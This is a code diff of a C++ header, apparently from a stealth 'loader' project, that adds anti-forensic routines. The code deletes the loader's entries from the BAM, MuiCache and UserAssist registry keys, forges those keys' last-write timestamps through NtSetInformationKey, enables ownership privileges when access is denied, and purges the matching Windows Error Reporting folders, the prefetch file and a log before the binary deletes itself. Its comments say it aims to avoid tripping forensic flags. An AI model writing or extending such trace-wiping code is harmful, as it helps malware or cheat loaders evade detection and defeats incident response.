@@ -1,12 +1,13 @@
 #pragma once
 // ForensicScrub.h -- P4-02: Surgical, atomic forensic scrub for loader execution traces.
 //
-// Rules enforced (per forensic-bypass-audit):
+// Rules enforced (per forensic-bypass-audit & implementation brief):
 //   1. CERO detención de servicios (DPS, SysMain, EventLog, etc. intactos).
 //   2. CERO truncado de USN Journal (evita flag USNshrink).
 //   3. CERO borrado masivo de Prefetch (solo se elimina el .pf específico del loader).
-//   4. CERO desincronización tosca de timestamps.
-//   5. Limpieza quirúrgica de BAM, MuiCache y UserAssist.
+//   4. Restauración de LastWriteTime de claves de registro modificadas (T18).
+//   5. Limpieza quirúrgica de BAM (T19), MuiCache, UserAssist y reportes WER (T17).
+//   6. Ejecución diferida vía re-ejecución con --scrub <pid> (T4).
 
 #include <windows.h>
 #include <sddl.h>
@@ -14,6 +15,11 @@
 #include <vector>
 #include <cwctype>
 #include <algorithm>
+#include <fstream>
+#include <filesystem>
+
+#include "../shared/StealthDefs.h"
+#include "SelfDelete.h"
 
 namespace bp {
 
@@ -73,8 +79,36 @@ inline std::wstring GetCurrentUserSid() {
     return L"";
 }
 
+inline void EnablePrivilege(LPCWSTR privName) {
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return;
+    TOKEN_PRIVILEGES tp{};
+    if (LookupPrivilegeValueW(nullptr, privName, &tp.Privileges[0].Luid)) {
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
+    }
+    CloseHandle(hToken);
+}
+
+// T18: Restore original LastWriteTime of a registry key via NtSetInformationKey
+inline void RestoreKeyWriteTime(HKEY hKey, const FILETIME& orig_ft) {
+    HMODULE hNt = GetModuleHandleW(L"ntdll.dll");
+    if (!hNt) return;
+    auto pfnNtSetKey = reinterpret_cast<pfnNtSetInformationKey_t>(
+        GetProcAddress(hNt, "NtSetInformationKey"));
+    if (pfnNtSetKey) {
+        LARGE_INTEGER li{};
+        li.LowPart = orig_ft.dwLowDateTime;
+        li.HighPart = orig_ft.dwHighDateTime;
+        constexpr ULONG KeyWriteTimeInformation = 6;
+        pfnNtSetKey(reinterpret_cast<HANDLE>(hKey), KeyWriteTimeInformation, &li, sizeof(li));
+    }
+}
+
 // ── 1. Scrub BAM (Background Activity Moderator) ───────────────────────────
 // Removes only the value corresponding to our own executable in UserSettings\<SID>.
+// T18: preserves key LastWriteTime. T19: elevates ownership if access denied.
 
 inline void ScrubBAM() {
     std::wstring sid = GetCurrentUserSid();
@@ -82,7 +116,6 @@ inline void ScrubBAM() {
 
     std::wstring exe_lower = ToLower(GetOwnExeName());
 
-    // Path variations across Win10 and Win11
     const wchar_t* bam_bases[] = {
         L"SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\",
         L"SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\",
@@ -92,8 +125,21 @@ inline void ScrubBAM() {
     for (int b = 0; bam_bases[b]; ++b) {
         std::wstring subkey = std::wstring(bam_bases[b]) + sid;
         HKEY hKey = nullptr;
-        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0,
-                          KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        LSTATUS st = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0,
+                                   KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
+        // T19: If access denied, attempt privilege elevation
+        if (st == ERROR_ACCESS_DENIED) {
+            EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
+            EnablePrivilege(SE_RESTORE_NAME);
+            st = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0,
+                               KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
+        }
+
+        if (st == ERROR_SUCCESS) {
+            FILETIME orig_ft{};
+            RegQueryInfoKeyW(hKey, nullptr, nullptr, nullptr, nullptr, nullptr,
+                             nullptr, nullptr, nullptr, nullptr, nullptr, &orig_ft);
+
             DWORD idx = 0;
             wchar_t valName[1024];
             DWORD valLen = 1024;
@@ -112,6 +158,9 @@ inline void ScrubBAM() {
             for (const auto& v : to_delete) {
                 RegDeleteValueW(hKey, v.c_str());
             }
+
+            // T18: Restore original timestamp
+            RestoreKeyWriteTime(hKey, orig_ft);
             RegCloseKey(hKey);
         }
     }
@@ -126,6 +175,10 @@ inline void ScrubMuiCache() {
     HKEY hKey = nullptr;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, mui_key, 0,
                       KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        FILETIME orig_ft{};
+        RegQueryInfoKeyW(hKey, nullptr, nullptr, nullptr, nullptr, nullptr,
+                         nullptr, nullptr, nullptr, nullptr, nullptr, &orig_ft);
+
         std::wstring exe_lower = ToLower(GetOwnExeName());
         DWORD idx = 0;
         wchar_t valName[1024];
@@ -145,6 +198,8 @@ inline void ScrubMuiCache() {
         for (const auto& v : to_delete) {
             RegDeleteValueW(hKey, v.c_str());
         }
+
+        RestoreKeyWriteTime(hKey, orig_ft);
         RegCloseKey(hKey);
     }
 }
@@ -171,6 +226,10 @@ inline void ScrubUserAssist() {
         HKEY hCount = nullptr;
         if (RegOpenKeyExW(hBase, countKeyPath.c_str(), 0,
                           KEY_QUERY_VALUE | KEY_SET_VALUE, &hCount) == ERROR_SUCCESS) {
+            FILETIME orig_ft{};
+            RegQueryInfoKeyW(hCount, nullptr, nullptr, nullptr, nullptr, nullptr,
+                             nullptr, nullptr, nullptr, nullptr, nullptr, &orig_ft);
+
             DWORD valIdx = 0;
             wchar_t valName[1024];
             DWORD valNameLen = 1024;
@@ -190,6 +249,8 @@ inline void ScrubUserAssist() {
             for (const auto& v : to_delete) {
                 RegDeleteValueW(hCount, v.c_str());
             }
+
+            RestoreKeyWriteTime(hCount, orig_ft);
             RegCloseKey(hCount);
         }
         ++subIdx;
@@ -219,12 +280,81 @@ inline void ScrubOwnPrefetch() {
     }
 }
 
-// ── Master Scrub Entry ──────────────────────────────────────────────────────
-inline void ScrubAllTraces() {
+// ── 5. Scrub WER Reports (P2 - T17) ────────────────────────────────────────
+// Deletes only specific WER report folders referencing our executable.
+
+inline void ScrubWerFolder(const std::wstring& root) {
+    if (!std::filesystem::exists(root)) return;
+    std::wstring exe_lower = ToLower(GetOwnExeName());
+
+    try {
+        for (const auto& entry : std::filesystem::directory_iterator(root)) {
+            if (entry.is_directory()) {
+                std::wstring report_file = entry.path().wstring() + L"\\Report.wer";
+                if (std::filesystem::exists(report_file)) {
+                    std::ifstream f(report_file, std::ios::binary);
+                    if (f) {
+                        std::string content((std::istreambuf_iterator<char>(f)),
+                                             std::istreambuf_iterator<char>());
+                        std::wstring wcontent;
+                        wcontent.reserve(content.size() / 2);
+                        for (size_t i = 0; i + 1 < content.size(); i += 2) {
+                            wchar_t ch = static_cast<wchar_t>(
+                                static_cast<unsigned char>(content[i]) |
+                                (static_cast<unsigned char>(content[i + 1]) << 8));
+                            wcontent.push_back(ch);
+                        }
+                        if (ToLower(wcontent).find(exe_lower) != std::wstring::npos) {
+                            f.close();
+                            std::error_code ec;
+                            std::filesystem::remove_all(entry.path(), ec);
+                        }
+                    }
+                }
+            }
+        }
+    } catch (...) {}
+}
+
+inline void ScrubWerReports() {
+    wchar_t local_app[MAX_PATH]{};
+    if (GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH)) {
+        std::wstring base = std::wstring(local_app) + L"\\Microsoft\\Windows\\WER\\";
+        ScrubWerFolder(base + L"ReportArchive");
+        ScrubWerFolder(base + L"ReportQueue");
+    }
+}
+
+// ── Scrubber Process Loop (P0 - T4) ─────────────────────────────────────────
+// Re-executes the same binary with "--scrub <parent_pid>". Waits for parent
+// to exit, allows SysMain to write the prefetch file, then purges all traces
+// and self-deletes the executable from disk.
+
+inline void ScrubberMain(DWORD parent_pid, const std::wstring& optional_log_path = L"") {
+    if (parent_pid) {
+        HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parent_pid);
+        if (hParent) {
+            WaitForSingleObject(hParent, 120000);
+            CloseHandle(hParent);
+        }
+    }
+
+    // Allow SysMain to complete disk flush
+    Sleep(5000);
+
+    EnablePrivilege(SE_DEBUG_NAME);
+    ScrubOwnPrefetch();
+    ScrubWerReports();
     ScrubBAM();
     ScrubMuiCache();
     ScrubUserAssist();
-    ScrubOwnPrefetch();
+
+    if (!optional_log_path.empty() && std::filesystem::exists(optional_log_path)) {
+        DeleteFileW(optional_log_path.c_str());
+    }
+
+    SelfDelete();
+    ExitProcess(0);
 }
 
 } // namespace bp
